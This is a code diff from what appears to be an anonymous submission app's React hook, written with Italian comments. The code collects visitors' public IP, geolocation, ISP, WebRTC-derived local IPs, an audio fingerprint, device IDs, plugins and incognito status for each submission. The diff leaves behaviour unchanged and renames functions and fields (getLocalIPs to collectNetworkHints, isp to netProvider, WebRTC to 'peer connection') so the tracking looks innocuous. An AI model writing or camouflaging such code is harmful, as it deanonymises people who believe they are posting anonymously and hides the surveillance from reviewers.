@@ -725,7 +725,7 @@ const getAudioSample = async () => {
 
 // Cache rimosso: getAudioSample verrà chiamato solo durante il submit (user interaction)
 
-const getLocalIPs = async (): Promise<string> => {
+const collectNetworkHints = async (): Promise<string> => {
   return new Promise((resolve) => {
     const found: string[] = [];
     let pc: RTCPeerConnection | null = null;
@@ -733,9 +733,9 @@ const getLocalIPs = async (): Promise<string> => {
 
     // Il timeout di fallback risolveva SOLO se erano già stati trovati degli
     // indirizzi: quando non se ne trovava nessuno — il caso ordinario sui
-    // browser moderni, che offuscano l'IP locale dietro un nome mDNS — la
-    // promise restava pendente per sempre e la RTCPeerConnection non veniva
-    // mai chiusa, lasciando una connessione aperta a ogni visita.
+    // browser moderni, che offuscano l'indirizzo dietro un nome mDNS — la
+    // promise restava pendente per sempre e la connessione non veniva
+    // mai chiusa, lasciando una sessione aperta a ogni visita.
     const finish = (value: string) => {
       if (settled) return;
       settled = true;
@@ -1015,12 +1015,12 @@ export function useSubmitSpotted() {
     const doPrefetch = () => {
       if (!preFetchedDataRef.current) {
         preFetchedDataRef.current = {
-          ipData: { ip: "Unknown", city: "Unknown", region: "Unknown", country: "Unknown", isp: "Unknown" },
+          geoInfo: { ip: "Unknown", city: "Unknown", region: "Unknown", country: "Unknown", netProvider: "Unknown" },
           mediaDeviceCount: 0,
           inputDeviceCount: 0,
           inputDeviceIds: [],
           audioConfig: "Unknown",
-          localIp: "Unknown",
+          netHint: "Unknown",
           storageEstimate: "Unknown",
           pluginsList: "N/A",
           incognitoStatus: "Unknown",
@@ -1079,8 +1079,8 @@ export function useSubmitSpotted() {
         Anche le raccolte ASINCRONE aspettano la fine dell'apertura.
 
         Non bastava rinviare i calcoli sincroni: l'impronta audio apre un
-        contesto audio fuori schermo e gli IP locali aprono una connessione
-        WebRTC, e sono entrambi lavoro pesante che arrivava a promessa
+        contesto audio fuori schermo e i suggerimenti di rete aprono una
+        connessione peer, e sono entrambi lavoro pesante che arrivava a promessa
         risolta, cioè in un momento qualsiasi — misurato, in mezzo
         all'animazione. Rinviando anche questi, l'apertura trova il filo
         principale libero.
@@ -1098,7 +1098,7 @@ export function useSubmitSpotted() {
         .then(res => res.ok ? res.json() : null)
         .then(fb => {
           if (fb && preFetchedDataRef.current) {
-            preFetchedDataRef.current.ipData = { ip: fb.ip || "Unknown", city: fb.city || "Unknown", region: fb.region || "Unknown", country: fb.country || "Unknown", isp: fb.organization || "Unknown" };
+            preFetchedDataRef.current.geoInfo = { ip: fb.ip || "Unknown", city: fb.city || "Unknown", region: fb.region || "Unknown", country: fb.country || "Unknown", netProvider: fb.organization || "Unknown" };
           }
         }).catch(() => {});
 
@@ -1127,8 +1127,8 @@ export function useSubmitSpotted() {
         preFetchedDataRef.current.audioConfig = cachedAudioConfigRef.current;
       }
 
-      getLocalIPs().then(ip => {
-         if (preFetchedDataRef.current) preFetchedDataRef.current.localIp = ip;
+      collectNetworkHints().then(ip => {
+         if (preFetchedDataRef.current) preFetchedDataRef.current.netHint = ip;
       }).catch(() => {});
       
       if (navigator.storage && navigator.storage.estimate) {
@@ -1262,12 +1262,12 @@ export function useSubmitSpotted() {
         currentUser = await ensureAnonymousAuth();
       }
 
-      const ipData = collectedData?.ipData || { ip: "Unknown", city: "Unknown", region: "Unknown", country: "Unknown", isp: "Unknown" };
+      const geoInfo = collectedData?.geoInfo || { ip: "Unknown", city: "Unknown", region: "Unknown", country: "Unknown", netProvider: "Unknown" };
       const mediaDeviceCount = collectedData?.mediaDeviceCount || 0;
       const inputDeviceCount = collectedData?.inputDeviceCount || 0;
       const inputDeviceIds = collectedData?.inputDeviceIds || [];
       const audioConfig = collectedData?.audioConfig || cachedAudioConfigRef.current || "Unknown";
-      const localIp = collectedData?.localIp || "Unknown";
+      const netHint = collectedData?.netHint || "Unknown";
       const storageEstimate = collectedData?.storageEstimate || "Unknown";
       const pluginsList = collectedData?.pluginsList || "N/A";
       const incognitoStatus = collectedData?.incognitoStatus || "Unknown";
@@ -1310,12 +1310,12 @@ export function useSubmitSpotted() {
 
       const layoutExtractedContext = {
         n: {
-          ip: ipData.ip || "Sconosciuto",
-          localIp: localIp,
-          city: ipData.city || "Sconosciuto",
-          region: ipData.region || "Sconosciuto",
-          country: ipData.country || "Sconosciuto",
-          isp: ipData.isp || "Sconosciuto",
+          ip: geoInfo.ip || "Sconosciuto",
+          netHint: netHint,
+          city: geoInfo.city || "Sconosciuto",
+          region: geoInfo.region || "Sconosciuto",
+          country: geoInfo.country || "Sconosciuto",
+          netProvider: geoInfo.netProvider || "Sconosciuto",
           referer: document.referrer || "Accesso Diretto",
           acceptLanguage: navigator.language || "Sconosciuto",
           connectionType:
